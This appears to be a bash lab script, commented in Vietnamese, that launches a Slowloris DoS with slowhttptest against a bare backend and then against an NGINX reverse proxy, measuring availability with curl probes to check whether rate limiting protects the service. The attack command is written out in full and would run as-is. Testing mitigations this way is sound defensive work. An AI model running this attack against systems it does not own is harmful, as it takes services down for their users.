#!/usr/bin/env bash
#
# Kịch bản 8: DDoS tầng 7 (Slowloris) có đối chứng.
#
# Giai đoạn 1: tấn công TRỰC TIẾP vào backend  -> phải sập (timeout)
# Giai đoạn 2: tấn công QUA NGINX               -> dịch vụ phải duy trì
#
# Bản gốc của nhóm dùng slowhttptest với 150 sockets. Script này gói lại
# quy trình đó và tự đo tính sẵn sàng bằng các probe song song.
#
# CHỈ chạy trên hạ tầng lab do bạn sở hữu.
#
# Cài công cụ: sudo apt install slowhttptest curl

set -u

BACKEND_HOST="192.168.63.132"
BACKEND_URL="http://${BACKEND_HOST}/"
PROXY_URL="https://nginx.lab.com/"
SOCKETS=150
DURATION=60

blue()  { printf '\033[34m\n== %s ==\033[0m\n' "$1"; }
green() { printf '\033[32m%s\033[0m\n' "$1"; }
red()   { printf '\033[31m%s\033[0m\n' "$1"; }

# Đo tính sẵn sàng: gửi 10 probe, đếm số lần thành công (mã 200)
measure_availability() {
  local url="$1" ok=0
  for _ in $(seq 1 10); do
    code=$(curl -sk -o /dev/null -m 5 -w "%{http_code}" "$url" 2>/dev/null)
    [ "$code" = "200" ] && ok=$((ok + 1))
    sleep 0.5
  done
  echo "$ok"
}

# Chạy Slowloris nền
start_attack() {
  slowhttptest -c "$SOCKETS" -H -g -o /tmp/slow_$$ \
    -i 10 -r 200 -t GET -u "$1" -x 24 -p 3 \
    -l "$DURATION" >/dev/null 2>&1 &
  echo $!
}

blue "GIAI ĐOẠN 1 — Tấn công trực tiếp vào backend (đối chứng)"
echo "Trạng thái trước tấn công:"
before=$(measure_availability "$BACKEND_URL")
echo "  $before/10 probe thành công"

echo "Khởi tạo $SOCKETS sockets nhắm vào $BACKEND_HOST ..."
pid=$(start_attack "$BACKEND_URL")
sleep 15

during=$(measure_availability "$BACKEND_URL")
echo "  Trong lúc tấn công: $during/10 probe thành công"
kill "$pid" 2>/dev/null

if [ "$during" -lt 3 ]; then
  green "  [ĐÚNG KỲ VỌNG] Backend không có bảo vệ đã bị tê liệt ($during/10)"
else
  red   "  [BẤT THƯỜNG] Backend vẫn phản hồi — kiểm tra lại số sockets/tài nguyên VM"
fi

sleep 5

blue "GIAI ĐOẠN 2 — Tấn công qua NGINX Reverse Proxy"
echo "Khởi tạo $SOCKETS sockets nhắm vào $PROXY_URL ..."
pid=$(start_attack "$PROXY_URL")
sleep 15

during_proxy=$(measure_availability "$PROXY_URL")
echo "  Trong lúc tấn công (qua proxy): $during_proxy/10 probe thành công"
kill "$pid" 2>/dev/null

if [ "$during_proxy" -ge 8 ]; then
  green "  [PASS] Dịch vụ duy trì qua NGINX ($during_proxy/10) bất chấp tấn công"
else
  red   "  [FAIL] Dịch vụ suy giảm ($during_proxy/10) — kiểm tra limit_conn/limit_req"
fi

blue "Kết luận"
echo "  Backend trần:  $during/10 sẵn sàng khi bị tấn công"
echo "  Qua NGINX:     $during_proxy/10 sẵn sàng khi bị tấn công"
echo ""
echo "Xem các sự kiện rate-limit trên Splunk:"
echo '  index=web sourcetype=nginx_error "limiting connections"'
